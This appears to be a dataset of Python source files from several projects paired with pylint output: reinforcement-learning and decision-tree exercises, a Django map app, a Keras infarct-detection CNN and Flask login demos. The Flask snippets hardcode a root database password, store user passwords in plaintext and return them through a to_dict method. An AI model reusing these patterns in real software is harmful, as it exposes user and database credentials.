22       parser = subparsers.add_parser(""runfn"", help=(""Run a specific bcbio-nextgen function.""
23                                                     ""Intended for distributed use.""))
24       parser.add_argument(""name"", help=""Name of the function to run"")
25       parser.add_argument(""argfile"", help=""JSON file with arguments to the function"")
","16 - warning: raise-missing-from
17 - warning: unspecified-encoding
"
"1   """"""Run distributed tasks in parallel using IPython or joblib on multiple cores.
2   """"""
3   import functools
4   
5   try:
6       import joblib
7   except ImportError:
8       joblib = False
9   
10   from bcbio.distributed import ipython
11   from bcbio.log import logger, setup_local_logging
12   from bcbio.provenance import diagnostics, system
13   
14   def parallel_runner(parallel, dirs, config):
15       """"""Process a supplied function: single, multi-processor or distributed.
16       """"""
17       def run_parallel(fn_name, items, metadata=None):
18           items = [x for x in items if x is not None]
19           if len(items) == 0:
20               return []
21           items = diagnostics.track_parallel(items, fn_name)
22           sysinfo = system.get_info(dirs, parallel)
23           if parallel[""type""] == ""ipython"":
24               return ipython.runner(parallel, fn_name, items, dirs[""work""], sysinfo, config)
25           else:
26               imodule = parallel.get(""module"", ""bcbio.distributed"")
27               logger.info(""multiprocessing: %s"" % fn_name)
28               fn = getattr(__import__(""{base}.multitasks"".format(base=imodule),
29                                       fromlist=[""multitasks""]),
30                            fn_name)
31               return run_multicore(fn, items, config, parallel[""cores""])
32       return run_parallel
33   
34   def zeromq_aware_logging(f):
35       """"""Ensure multiprocessing logging uses ZeroMQ queues.
36   
37       ZeroMQ and local stdout/stderr do not behave nicely when intertwined. This
38       ensures the local logging uses existing ZeroMQ logging queues.
39       """"""
40       @functools.wraps(f)
41       def wrapper(*args, **kwargs):
42           config = None
43           for arg in args:
44               if ipython.is_std_config_arg(arg):
45                   config = arg
46                   break
47               elif ipython.is_nested_config_arg(arg):
48                   config = arg[""config""]
49                   break
50           assert config, ""Could not find config dictionary in function arguments.""
51           if config.get(""parallel"", {}).get(""log_queue""):
52               handler = setup_local_logging(config, config[""parallel""])
53           else:
54               handler = None
55           try:
56               out = f(*args, **kwargs)
57           finally:
58               if handler and hasattr(handler, ""close""):
59                   handler.close()
60           return out
61       return wrapper
62   
63   def run_multicore(fn, items, config, cores=None):
64       """"""Run the function using multiple cores on the given items to process.
65       """"""
66       if cores is None:
67           cores = config[""algorithm""].get(""num_cores"", 1)
68       parallel = {""type"": ""local"", ""cores"": cores}
69       sysinfo = system.get_info({}, parallel)
70       jobr = ipython.find_job_resources([fn], parallel, items, sysinfo, config,
71                                         parallel.get(""multiplier"", 1),
72                                         max_multicore=int(sysinfo[""cores""]))
73       items = [ipython.add_cores_to_config(x, jobr.cores_per_job) for x in items]
74       if joblib is None:
75           raise ImportError(""Need joblib for multiprocessing parallelization"")
76       out = []
77       for data in joblib.Parallel(jobr.num_jobs)(joblib.delayed(fn)(x) for x in items):
78           if data:
79               out.extend(data)
80       return out
","23 - refactor: no-else-return
17 - warning: unused-argument
44 - refactor: no-else-break
"
"1   import copy
2   
3   # Setup:
4   s = ""s""
5   states = [""s"", ""!s""]
6   actions = [""N"", ""M""]
7   Xt = {""A1"": 1.0, ""A2"": 1.0}
8   R = {""s"": 2.0, ""!s"": 3.0}
9   y = 0.5
10   
11   def E(c, R):
12       E = c * max(R.values())
13       return E
14   
15   def max_key(dictionary):
16       return list(Xt.keys())[list(Xt.values()).index(max(Xt.values()))]
17   
18   def value_iteration(states, Xt, y):
19       iterations = 0
20       best = 0
21       U = [0] * len(states)
22       U_ = [0] * len(states)
23       A = [""""] * len(states)
24   
25       while (best < E((1 - y), R) / y and iterations < 1000):
26           U = copy.deepcopy(U_)
27           best = 0
28           for i, state in enumerate(states):
29   
30               # VELGER UANSETT DEN MEST SANNSYNLIGE TRANSITION... DET ER JO IKKE NOE BRA POLICY...
31   
32               best_action = max_key(Xt)
33               U_[i] = R[state] + y * max([a * U[i] for a in Xt.values()])
34                
35               if abs(U_[i] - U[i]) > best:
36                   best = abs(U_[i] - U[i])
37   
38           iterations += 1
39           # y = y * 0.99
40   
41       print(""Found optimal policy after %d iteration(s)"" % iterations)
42       print(""Best policy: "", str(A))
43   
44   
45   value_iteration(states, Xt, y)
","11 - warning: redefined-outer-name
12 - warning: redefined-outer-name
15 - warning: unused-argument
18 - warning: redefined-outer-name
18 - warning: redefined-outer-name
18 - warning: redefined-outer-name
33 - refactor: consider-using-generator
35 - refactor: consider-using-max-builtin
32 - warning: unused-variable
"
"1   import random
2   import sys
3   actions = [""LEFT"", ""RIGHT"", ""UP"", ""DOWN""]
4   
5   def perform_action(x, y, action):
6       if action == ""LEFT""  and x != 0: return x-1, y
7       if action == ""RIGHT"" and x != 3: return x+1, y
8       if action == ""UP""    and y != 0: return x, y-1
9       if action == ""DOWN""  and y != 2: return x, y+1
10       return x, y
11   
12   def transition_model(x, y, action):
13       preferred = [
14           [""RIGHT"", ""RIGHT"", ""RIGHT"", ""LEFT""],
15           [""UP"",    ""DOWN"",  ""UP"",    ""UP""   ],
16           [""UP"",    ""LEFT"",  ""UP"",    ""LEFT""],
17       ][y][x] 
18       return 1 if action == preferred else 0.0
19    
20   def policy_evaluation(policy, utilities, states, discount):
21       for x, y in states:
22           transitions = [transition_model(x, y, policy[y][x]) * utilities[yy][xx] for xx, yy in all_possibles(x, y)]
23           utilities[y][x] = reward[y][x] + discount * sum(transitions)
24       return utilities
25   
26   
27   def best_action(state, u):
28       best_action = (None, -sys.maxsize)
29       for a in actions:
30           score = aciton_score(state, a, u)
31           if score > best_action[1]:
32               best_action = (a, score)
33       return best_action
34   
35   all_possibles = lambda x, y: [perform_action(x, y, action) for action in actions]
36   aciton_score = lambda s, a, u: sum([transition_model(x, y, a) * u[y][x] for x, y in all_possibles(*s)])
37   
38   
39   reward = [
40       [-0.04, -0.04, -0.04, +1],
41       [-0.04, -100,  -0.04, -1],
42       [-0.04, -0.04, -0.04, -0.04],
43   ]
44   states = [(x, y) for x in range(4) for y in range(3)]
45   random_initial_policy = [random.sample(actions, 4)]*3
46   
47   def policy_iteration(mdp, policy, discount):
48       
49       unchanged = False 
50       u = [[0]*4]*3
51       i = 0
52       while not unchanged: 
53           # Evaluate policy using bellman equation
54           u = policy_evaluation(policy, u, states, discount)
55           unchanged = True
56           
57           for state in mdp:
58               x, y = state
59               # Compare with action in policy with all others to see if best:
60               if best_action(state, u)[1] > aciton_score(state, policy[y][x], u):
61                   policy[y][x] = best_action(state, u)[0]
62   
63                   # Mark as changed to loop one more time.
64                   unchanged = False
65           if i == 100: break
66           i += 1
67       return policy
68       
69   print(policy_iteration(states, random_initial_policy, 0.9))","20 - warning: redefined-outer-name
28 - warning: redefined-outer-name
36 - refactor: consider-using-generator
"
"1   # %%
2   import numpy as np
3   
4   # Transition model for state_t (Answer to to PART A, 1)
5   Xt = np.array([[0.7, 0.3], [0.3, 0.7]])
6   
7   # Sensor model for state_t (Answer to PART A, 2)
8   O1 = np.array([[0.9, .0], [.0, 0.2]])
9   O3 = np.array([[0.1, .0], [.0, 0.8]])
10   
11   
12   init = np.array([0.5, 0.5])
13   
14   
15   def forward(f, Xt, OT, OF, E, k):
16       t = Xt.transpose().dot(f)        # Transition
17       u = (OT if E[k] else OF).dot(t)  # Update
18       delta = u / np.sum(u)            # Normalize
19   
20       # Day 0 (base case)?
21       if not k:
22           return delta
23       return forward(delta, Xt, OT, OF, E, k-1)
24   
25   def backward(Xt, OT, OF, E, k):
26       e = (OT if E[k] else OF)
27       if k < len(E)-1:
28           res = Xt.dot(e).dot(backward(Xt, OT, OF, E, k+1))
29       else: 
30           res = Xt.dot(e).dot(np.array([1, 1]))
31       
32       return res / np.sum(res)
33   
34   E = [True, True]
35   rain_day_2 = forward(init, Xt, O1, O3, E, len(E)-1)
36   print(""Probability of rain on day 2 using forward:  "", rain_day_2)
37   
38   E = np.array([True, True, False, True, True]) 
39   print(""Probability of rain on day 5 using forward:  "", forward(init, Xt, O1, O3, E, len(E)-1))
40   print(""Probability of rain on day 2 using backward: "", backward(Xt, O1, O3, E, 0)) 
41   
","15 - refactor: too-many-arguments
15 - refactor: too-many-positional-arguments
15 - warning: redefined-outer-name
15 - warning: redefined-outer-name
25 - warning: redefined-outer-name
25 - warning: redefined-outer-name
"
"1   import pandas as pd
2   from math import log2
3   
4   _TRAINING_FILE = ""/Users/magnus/Downloads/data/training.csv""
5   _TESTING_FILE = ""/Users/magnus/Downloads/data/test.csv""
6   
7   def entropy(V):
8       """""" ENTROPY SHOWS HOW MUCH OF THE TOTAL DECSISION SPACE AN ATTRIBUTE TAKES UP """"""
9       return - sum(vk * log2(vk) for vk in V if vk > 0)
10   
11   def remainder(attribute, examples):
12       """""" REMAINDER EXPLAINS HOW MUCH IS UNDECIDED AFTER AN ATTRIBUTE IS SET """"""
13       remain = 0
14       p, n = len(examples[examples['CLASS'] == 1]), len(examples[examples['CLASS'] == 2])
15       for k in examples[attribute].unique():
16           ex = examples[[attribute, 'CLASS']][examples[attribute] == k]
17           pk, nk = len(ex[ex['CLASS'] == 1]), len(ex[ex['CLASS'] == 2])
18           remain += ((pk + nk) / (p + n)) * entropy([pk / (pk + nk), nk / (pk + nk)])
19       return remain
20   
21   def importance(attribute, examples):
22       """""" INFORMATION GAIN FORMULA """"""
23       p = len(examples[attribute][examples['CLASS'] == 1])
24       n = len(examples[attribute][examples['CLASS'] == 2])
25       return entropy([p/(p+n), n/(p+n)]) - remainder(attribute, examples)
26   
27   def plurality(examples):
28       return 1 if len(examples['CLASS'][examples['CLASS'] == 1]) > len(examples['CLASS']) / 2 else 2
29   
30   def decision_tree(examples, attributes, parent_examples):
31       """""" CREATES A DECISION TREE BASED ON A SET OF EXAMPLES AND ATTRIBUTES. """"""
32       if examples.empty:                   return plurality(parent_examples)
33       elif (examples['CLASS'] == 1).all(): return 1
34       elif (examples['CLASS'] == 2).all(): return 2
35       elif attributes.empty:               return plurality(examples)
36       
37       rating = [importance(a, examples) for a in attributes]
38       A = attributes[rating.index(max(rating))]
39       node = {A: {}}
40       for k in examples[A].unique():
41           node[A][k] = decision_tree(examples[examples[A] == k], attributes.drop(A), examples)
42       return node
43   
44   def classify(tree, example):
45       attr = list(tree.keys())[0]
46       res = tree[attr][example[attr]]
47       if isinstance(res, dict):
48           return classify(res, example)
49       else:
50           return res
51       
52   
53   if __name__ == ""__main__"":
54       # Load datasets:
55       training = pd.read_csv(_TRAINING_FILE, header=0)
56       testing = pd.read_csv(_TESTING_FILE, header=0)
57   
58       # Build tree:
59       tree = decision_tree(training, training.columns[:-1], None)
60       
61       # Test by classifying each dataset:
62       for name, data in {""train"":training, ""test"": testing}.items():
63           correct = 0
64           for _, example in data.iterrows():
65               classification = example['CLASS']
66               result = classify(tree, example.drop('CLASS'))
67               correct += 1 if result == classification else 0
68           print(""Accuracy on"", name, ""set:\t"", correct / len(data))","32 - refactor: no-else-return
44 - warning: redefined-outer-name
44 - warning: redefined-outer-name
47 - refactor: no-else-return
"
"1   from django.urls import path
2   from django.conf import settings
3   from django.conf.urls.static import static
4   
5   from map.views import MapView
6   from map.api import SpotsApi, SpotApi, RatingsApi, VotesApi
7   
8   app_name = 'map'
9   urlpatterns = [
10       path('', MapView.as_view(), name='index'),
11   
12       path('spots/',                              SpotsApi.as_view()),
13       path('spots/<int:spot_id>/',                SpotApi.as_view()),
14       path('spots/<int:spot_id>/ratings/',        RatingsApi.as_view()),
15       path('spots/<int:spot_id>/votes/',          VotesApi.as_view()),
16   ]
17   
18   if settings.DEBUG is True:
19       urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
","Clean Code: No Issues Detected
"
"1   # Generated by Django 2.0.1 on 2018-03-06 21:19
2   
3   from django.db import migrations
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('map', '0009_auto_20180305_2215'),
10       ]
11   
12       operations = [
13           migrations.RenameField(
14               model_name='rating',
15               old_name='rating',
16               new_name='rating_type',
17           ),
18       ]
","6 - refactor: too-few-public-methods
"
"1   # Generated by Django 2.0.1 on 2018-03-05 22:11
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('map', '0007_auto_20180305_2139'),
10       ]
11   
12       operations = [
13           migrations.RenameField(
14               model_name='rating',
15               old_name='rating_type',
16               new_name='rating',
17           ),
18           migrations.AddField(
19               model_name='rating',
20               name='score',
21               field=models.IntegerField(default=0),
22           ),
23       ]
","6 - refactor: too-few-public-methods
"
"1   from django.db import models
2   from django.core.validators import MaxValueValidator, MinValueValidator
3   
4   
5   class Spot(models.Model):
6   
7       name = models.CharField(max_length=50)
8       description = models.CharField(max_length=500)
9       latitude = models.DecimalField(max_digits=10, decimal_places=7)
10       longitude = models.DecimalField(max_digits=10, decimal_places=7)
11       created = models.DateTimeField(auto_now_add=True)
12       updated = models.DateTimeField(auto_now=True)
13   
14       def __str__(self):
15           spot = ""Spot %s - %s: %s"" % (self.id, self.name, self.description)
16           return spot
17   
18       def get_score(self):
19           votes = Vote.objects.filter(spot=self.id)
20   
21           score = 0
22           for vote in votes:
23               score += 1 if vote.positive else -1
24   
25           return score
26   
27       def get_ratings_dict(self):
28           ratings = Rating.objects.filter(spot=self.id)
29   
30           ratings_dict = {}
31           for rating in ratings:
32               if rating.rating_type.name in ratings_dict:
33                   ratings_dict[rating.rating_type.name] += rating.score
34               else:
35                   ratings_dict[rating.rating_type.name] = rating.score
36   
37           for rating_type, score in ratings_dict.items():
38               ratings_dict[rating_type] = round((score / ratings.count()), 2)
39   
40           return ratings_dict
41   
42   class RatingType(models.Model):
43   
44       name = models.CharField(max_length=50)
45   
46       def __str__(self):
47           rating_type = self.name
48           return rating_type
49   
50   class Rating(models.Model):
51   
52       spot = models.ForeignKey(Spot, on_delete=models.CASCADE)
53       rating_type = models.ForeignKey(RatingType, on_delete=models.CASCADE)
54       score = models.IntegerField(
55           validators=[
56               MaxValueValidator(10),
57               MinValueValidator(1)
58           ]
59       )
60   
61   class Vote(models.Model):
62   
63       spot = models.ForeignKey(Spot, on_delete=models.CASCADE)
64       positive = models.BooleanField()
","42 - refactor: too-few-public-methods
50 - refactor: too-few-public-methods
61 - refactor: too-few-public-methods
"
"1   # Generated by Django 2.0.1 on 2018-03-05 22:15
2   
3   from django.db import migrations, models
4   import django.db.models.deletion
5   
6   
7   class Migration(migrations.Migration):
8   
9       dependencies = [
10           ('map', '0008_auto_20180305_2211'),
11       ]
12   
13       operations = [
14           migrations.CreateModel(
15               name='Vote',
16               fields=[
17                   ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
18                   ('positive', models.BooleanField()),
19                   ('spot', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to='map.Spot')),
20               ],
21           ),
22           migrations.AlterField(
23               model_name='rating',
24               name='score',
25               field=models.IntegerField(),
26           ),
27       ]
","7 - refactor: too-few-public-methods
"
"1   from django.shortcuts import render
2   from django.views import View
3   
4   class MapView(View):
5       def get(self, request):
6           return render(request, 'map/index.html')
","4 - refactor: too-few-public-methods
"
"1   from django import forms
2   from django.forms import ModelForm, Textarea
3   
4   from map.models import Spot, Rating, Vote
5   
6   class SpotForm(ModelForm):
7       class Meta:
8           model = Spot
9           fields = ['name', 'description', 'latitude', 'longitude']
10           widgets = {
11               'latitude': forms.HiddenInput(),
12               'longitude': forms.HiddenInput(),
13           }
14   
15   class RatingForm(ModelForm):
16       class Meta:
17           model = Rating
18           fields = ['spot', 'rating_type', 'score']
19           widgets = {
20               'spot': forms.HiddenInput(),
21               'rating_type': forms.HiddenInput(),
22           }
23   
24   class VoteForm(ModelForm):
25       class Meta:
26           model = Vote
27           fields = ['positive']
28           widgets = {
29               'positive': forms.HiddenInput(),
30           }
","7 - refactor: too-few-public-methods
6 - refactor: too-few-public-methods
16 - refactor: too-few-public-methods
15 - refactor: too-few-public-methods
25 - refactor: too-few-public-methods
24 - refactor: too-few-public-methods
2 - warning: unused-import
"
"1   from abc import ABC, ABCMeta, abstractmethod
2   from django.forms.models import model_to_dict
3   from django.http import HttpResponse, JsonResponse
4   from django.shortcuts import get_object_or_404
5   from django.views import View
6   from django.views.decorators.csrf import csrf_exempt
7   from django.utils.decorators import method_decorator
8   from map.models import Spot
9   from map.models import Vote
10   from map.forms import SpotForm, VoteForm
11   
12   class BaseApi(View):
13       __metaclass__ = ABCMeta
14   
15       def _response(self, body):
16           response = {'data': body}
17           return JsonResponse(response)
18   
19       def _error_response(self, status, error):
20           response = {'error': error}
21           return JsonResponse(response, status=status)
22   
23   
24   class BaseSpotsApi(BaseApi):
25       __metaclass__ = ABCMeta
26   
27       def _spot_to_dict(self, spot):
28           spot_dict = model_to_dict(spot)
29           spot_dict['score'] = spot.get_score()
30   
31           return spot_dict
32   
33   # @method_decorator(csrf_exempt, name='dispatch')
34   class SpotsApi(BaseSpotsApi):
35       def get(self, request):
36           # TODO: only retrieve nearest spots and make them dynamically load as the map moves
37           nearby_spots = Spot.objects.all()
38           nearby_spots = list(map(self._spot_to_dict, nearby_spots))
39   
40           return self._response(nearby_spots)
41   
42       def post(self, request):
43           form = SpotForm(request.POST)
44   
45           if form.is_valid():
46               new_spot = Spot(
47                   name=request.POST['name'],
48                   description=request.POST['description'],
49                   latitude=request.POST['latitude'],
50                   longitude=request.POST['longitude']
51               )
52               new_spot.save()
53   
54               return self._response(self._spot_to_dict(new_spot))
55   
56           return self._error_response(422, 'Invalid input.')
57   
58   class SpotApi(BaseSpotsApi):
59       def get(self, request, spot_id):
60           spot = get_object_or_404(Spot, pk=spot_id)
61   
62           return self._response(self._spot_to_dict(spot))
63   
64   # @method_decorator(csrf_exempt, name='dispatch')
65   class RatingsApi(BaseApi):
66       def get(self, request, spot_id):
67           spot = get_object_or_404(Spot, pk=spot_id)
68   
69           ratings = Rating.objects.filter(spot=spot_id, rating_type=rating_type.id)
70   
71           pass
72   
73       def post(self, request, spot_id):
74           spot = get_object_or_404(Spot, pk=spot_id)
75   
76           pass
77   
78   # @method_decorator(csrf_exempt, name='dispatch')
79   class VotesApi(BaseApi):
80       def get(self, request, spot_id):
81           spot = get_object_or_404(Spot, pk=spot_id)
82   
83           return self._response(spot.get_score())
84   
85       def post(self, request, spot_id):
86           spot = get_object_or_404(Spot, pk=spot_id)
87           form = VoteForm(request.POST)
88   
89           if form.is_valid():
90               new_vote = Vote(spot=spot, positive=request.POST['positive'])
91               new_vote.save()
92   
93               return self._response(model_to_dict(new_vote))
94   
95           return self._error_response(422, 'Invalid input.')
","36 - warning: fixme
12 - refactor: too-few-public-methods
24 - refactor: too-few-public-methods
35 - warning: unused-argument
59 - warning: unused-argument
58 - refactor: too-few-public-methods
69 - error: undefined-variable
69 - error: undefined-variable
71 - warning: unnecessary-pass
66 - warning: unused-argument
67 - warning: unused-variable
69 - warning: unused-variable
76 - warning: unnecessary-pass
73 - warning: unused-argument
74 - warning: unused-variable
80 - warning: unused-argument
1 - warning: unused-import
1 - warning: unused-import
3 - warning: unused-import
6 - warning: unused-import
7 - warning: unused-import
"
"1   # Generated by Django 2.0.1 on 2018-03-05 21:39
2   
3   from django.db import migrations
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('map', '0006_rating'),
10       ]
11   
12       operations = [
13           migrations.RenameField(
14               model_name='rating',
15               old_name='rating_type_id',
16               new_name='rating_type',
17           ),
18           migrations.RenameField(
19               model_name='rating',
20               old_name='spot_id',
21               new_name='spot',
22           ),
23       ]
","6 - refactor: too-few-public-methods
"
"1   # Generated by Django 2.0.1 on 2018-03-05 21:31
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('map', '0004_ratingtype'),
10       ]
11   
12       operations = [
13           migrations.AlterField(
14               model_name='spot',
15               name='latitude',
16               field=models.DecimalField(decimal_places=7, max_digits=10),
17           ),
18           migrations.AlterField(
19               model_name='spot',
20               name='longitude',
21               field=models.DecimalField(decimal_places=7, max_digits=10),
22           ),
23       ]
","6 - refactor: too-few-public-methods
"
"1   # Generated by Django 2.0 on 2017-12-17 18:04
2   
3   from django.db import migrations, models
4   
5   
6   class Migration(migrations.Migration):
7   
8       initial = True
9   
10       dependencies = [
11       ]
12   
13       operations = [
14           migrations.CreateModel(
15               name='Spot',
16               fields=[
17                   ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
18                   ('name', models.CharField(max_length=50)),
19                   ('description', models.CharField(max_length=500)),
20                   ('latitude', models.DecimalField(decimal_places=6, max_digits=9)),
21                   ('longitude', models.DecimalField(decimal_places=6, max_digits=9)),
22               ],
23           ),
24       ]
","6 - refactor: too-few-public-methods
"
"1   """"""
2       Heart attack detection in colour images using convolutional neural networks
3   
4       This code make a neural network to detect infarcts
5       Written by Gabriel Rojas - 2019
6       Copyright (c) 2019 G0 S.A.S.
7       Licensed under the MIT License (see LICENSE for details)
8   """"""
9   
10   
11   from os import scandir
12   import numpy as np
13   from keras.models import load_model
14   from keras.preprocessing.image import load_img, img_to_array
15   from keras.preprocessing.image import ImageDataGenerator
16   
17   # === Configuration vars ===
18   # Path of image folder
19   INPUT_PATH_TEST = ""./dataset/test/""
20   MODEL_PATH = ""./model/"" + ""model.h5""    # Full path of model
21   
22   # Test configurations
23   WIDTH, HEIGHT = 256, 256        # Size images to train
24   CLASS_COUNTING = True           # Test class per class and show details each 
25   BATCH_SIZE = 32                 # How many images at the same time, change depending on your GPU
26   CLASSES = ['00None', '01Infarct']   # Classes to detect. they most be in same position with output vector
27   # === ===== ===== ===== ===
28   
29   print(""Loading model from:"", MODEL_PATH)
30   NET = load_model(MODEL_PATH)
31   NET.summary()
32   
33   def predict(file):
34       """"""
35       Returns values predicted
36       """"""
37       x = load_img(file, target_size=(WIDTH, HEIGHT))
38       x = img_to_array(x)
39       x = np.expand_dims(x, axis=0)
40       array = NET.predict(x)
41       result = array[0]
42       answer = np.argmax(result)
43       return CLASSES[answer], result
44   
45   print(""\n======= ======== ========"")
46   
47   if CLASS_COUNTING:
48       folders = [arch.name for arch in scandir(INPUT_PATH_TEST) if arch.is_file() == False]
49   
50       generalSuccess = 0
51       generalCases = 0
52       for f in folders:
53           files = [arch.name for arch in scandir(INPUT_PATH_TEST + f) if arch.is_file()]
54           clase = f.replace(INPUT_PATH_TEST, '')
55           print(""Class: "", clase)
56           indivSuccess = 0
57           indivCases = 0
58           for a in files:
59               p, r = predict(INPUT_PATH_TEST + f + ""/"" + a)
60               if p == clase:
61                   indivSuccess = indivSuccess + 1
62               #elif p == '00None':
63               #    print(f + ""/"" + a)
64               indivCases = indivCases + 1
65   
66           print(""\tCases"", indivCases, ""Success"", indivSuccess, ""Rate"", indivSuccess/indivCases)
67           
68           generalSuccess = generalSuccess + indivSuccess
69           generalCases = generalCases + indivCases
70   
71       print(""Totals: "")
72       print(""\tCases"", generalCases, ""Success"", generalSuccess, ""Rate"", generalSuccess/generalCases)
73   else:
74       test_datagen = ImageDataGenerator()
75       test_gen = test_datagen.flow_from_directory(
76       INPUT_PATH_TEST,
77       target_size=(HEIGHT, WIDTH),
78       batch_size=BATCH_SIZE,
79       class_mode='categorical')
80       scoreSeg = NET.evaluate_generator(test_gen, 100)
81       progress = 'loss: {}, acc: {}, mse: {}'.format(
82           round(float(scoreSeg[0]), 4), 
83           round(float(scoreSeg[1]), 4), 
84           round(float(scoreSeg[2]), 4)
85           )
86       print(progress)
87   
88   print(""======= ======== ========"")
","Clean Code: No Issues Detected
"
"1   """"""
2       Heart attack detection in colour images using convolutional neural networks
3   
4       This code make a neural network to detect infarcts
5       Written by Gabriel Rojas - 2019
6       Copyright (c) 2019 G0 S.A.S.
7       Licensed under the MIT License (see LICENSE for details)
8   """"""
9   
10   import os
11   import sys
12   from time import time
13   import tensorflow
14   import keras
15   from keras import backend as K
16   from keras.models import Sequential
17   from keras.optimizers import SGD
18   from keras.preprocessing.image import ImageDataGenerator
19   from keras.layers import Dropout, Flatten, Dense, Activation
20   from keras.layers import  Convolution2D, MaxPooling2D, ZeroPadding2D
21   
22   # === Configuration vars ===
23   # Path of image folder (use slash at the end)
24   INPUT_PATH_TRAIN = ""./dataset/train/""
25   INPUT_PATH_VAL = ""./dataset/val/""
26   INPUT_PATH_TEST = ""./dataset/test/""
27   OUTPUT_DIR = ""./model/""
28   
29   # Checkpoints
30   EPOCH_CHECK_POINT = 2   # How many epoch til save next checkpoint
31   NUM_CHECK_POINT = 10    # How many epoch will be saved
32   KEEP_ONLY_LATEST = False# Keeping only the last checkpoint
33   
34   # Train configurations
35   WIDTH, HEIGHT = 256, 256# Size images to train
36   STEPS = 500             # How many steps per epoch
37   VALIDATION_STEPS = 100  # How many steps per next validation
38   BATCH_SIZE = 48         # How many images at the same time, change depending on your GPU
39   LR = 0.003              # Learning rate
40   CLASSES = 2             # Don't chage, 0=Infarct, 1=Normal
41   # === ===== ===== ===== ===
42   
43   if not os.path.exists(OUTPUT_DIR):
44       os.mkdir(OUTPUT_DIR)
45   
46   K.clear_session()
47   
48   train_datagen = ImageDataGenerator()
49   val_datagen = ImageDataGenerator()
50   test_datagen = ImageDataGenerator()
51   
52   train_gen = train_datagen.flow_from_directory(
53       INPUT_PATH_TRAIN,
54       target_size=(HEIGHT, WIDTH),
55       batch_size=BATCH_SIZE,
56       class_mode='categorical')
57   val_gen = val_datagen.flow_from_directory(
58       INPUT_PATH_VAL,
59       target_size=(HEIGHT, WIDTH),
60       batch_size=BATCH_SIZE,
61       class_mode='categorical')
62   test_gen = test_datagen.flow_from_directory(
63       INPUT_PATH_TEST,
64       target_size=(HEIGHT, WIDTH),
65       batch_size=BATCH_SIZE,
66       class_mode='categorical')
67   
68   NET = Sequential()
69   NET.add(Convolution2D(64, kernel_size=(3 ,3), padding =""same"", input_shape=(256, 256, 3), activation='relu'))
70   NET.add(MaxPooling2D((3,3), strides=(3,3)))
71   NET.add(Convolution2D(128, kernel_size=(3, 3), activation='relu'))
72   NET.add(MaxPooling2D((3,3), strides=(3,3)))
73   NET.add(Convolution2D(256, kernel_size=(3, 3), activation='relu'))
74   NET.add(MaxPooling2D((2,2), strides=(2,2)))
75   NET.add(Convolution2D(512, kernel_size=(3, 3), activation='relu'))
76   NET.add(MaxPooling2D((2,2), strides=(2,2)))
77   NET.add(Convolution2D(1024, kernel_size=(3, 3), activation='relu'))
78   NET.add(MaxPooling2D((2,2), strides=(2,2)))
79   NET.add(Dropout(0.3))
80   NET.add(Flatten())
81   
82   for _ in range(5):
83       NET.add(Dense(128, activation='relu'))
84   NET.add(Dropout(0.5))
85   
86   for _ in range(5):
87       NET.add(Dense(128, activation='relu'))
88   NET.add(Dropout(0.5))
89   
90   for _ in range(5):
91       NET.add(Dense(128, activation='relu'))
92   NET.add(Dropout(0.5))
93   
94   NET.add(Dense(CLASSES, activation='softmax'))
95   
96   sgd = SGD(lr=LR, decay=1e-4, momentum=0.9, nesterov=True)
97   
98   NET.compile(optimizer=sgd,
99                 loss='binary_crossentropy',
100                 metrics=['acc', 'mse'])
101   
102   NET.summary()
103   
104   for i in range(NUM_CHECK_POINT):        
105       NET.fit_generator(
106           train_gen,
107           steps_per_epoch=STEPS,
108           epochs=EPOCH_CHECK_POINT,
109           validation_data=val_gen,
110           validation_steps=VALIDATION_STEPS,
111           verbose=1
112       )   
113       
114       print('Saving model: {:02}.'.format(i))
115       NET.save(OUTPUT_DIR + ""{:02}_model.h5"".format(i))
","11 - warning: unused-import
12 - warning: unused-import
13 - warning: unused-import
14 - warning: unused-import
19 - warning: unused-import
20 - warning: unused-import
"
"1   from flask import Flask, render_template, request
2   from flask_sqlalchemy import SQLAlchemy
3   
4   import pymysql
5   pymysql.install_as_MySQLdb()
6   
7   app = Flask(__name__)
8   app.config['SQLALCHEMY_DATABASE_URI']=""mysql://root:horsin@123@localhost:3306/flask""
9   app.config['SQLALCHEMY_COMMIT_ON_TEARDOWN'] = True
10   
11   db = SQLAlchemy(app)
12   
13   class loginUser(db.Model):
14       __tablename__ = ""loginUser""
15       id = db.Column(db.Integer, primary_key=True, autoincrement=True)
16       username = db.Column(db.String(30), unique=True)
17       passwd = db.Column(db.String(120))
18   
19       def __init__(self, username, passwd):
20           self.username = username
21           self.passwd = passwd
22   
23       def __repr__(self):
24           return ""<loginUser: %r>"" % self.username
25   
26   db.create_all()
27   
28   @app.route('/login')
29   def login_views():
30       return render_template('06-login.html')
31   
32   @app.route('/server', methods=['POST'])
33   def server_views():
34       username = request.form['username']
35       user = loginUser.query.filter_by(username=username).first()
36       if user:
37           return ""找到用户名为 %s 的账户"" % user.username
38       else:
39           return ""找不到该用户!""
40   
41   if __name__ == '__main__':
42       app.run(debug=True)","13 - refactor: too-few-public-methods
36 - refactor: no-else-return
"
"1   from flask import Flask, render_template
2   from flask_sqlalchemy import SQLAlchemy
3   import json
4   
5   import pymysql
6   pymysql.install_as_MySQLdb()
7   
8   app = Flask(__name__)
9   app.config[""SQLALCHEMY_DATABASE_URI""]=""mysql://root:horsin@123@localhost:3306/flask""
10   app.config['SQLALCHEMY_COMMIT_ON_TEARDOWN'] = True
11   
12   db = SQLAlchemy(app)
13   
14   class Users(db.Model):
15       __tablename__ = ""users""
16       id = db.Column(db.Integer,primary_key=True)
17       uname = db.Column(db.String(50))
18       upwd = db.Column(db.String(50))
19       realname = db.Column(db.String(30))
20   
21       # 将当前对象中的所有属性封装到一个字典中
22       def to_dict(self):
23           dic = {
24               ""id"" : self.id,
25               ""uname"" : self.uname,
26               ""upwd"" : self.upwd,
27               ""realname"" : self.realname
28           }
29           return dic
30   
31       def __init__(self,uname,upwd,realname):
32           self.uname = uname
33           self.upwd = upwd
34           self.realname = realname
35   
36       def __repr__(self):
37           return ""<Users : %r>"" % self.uname
38   
39   @app.route('/json')
40   def json_views():
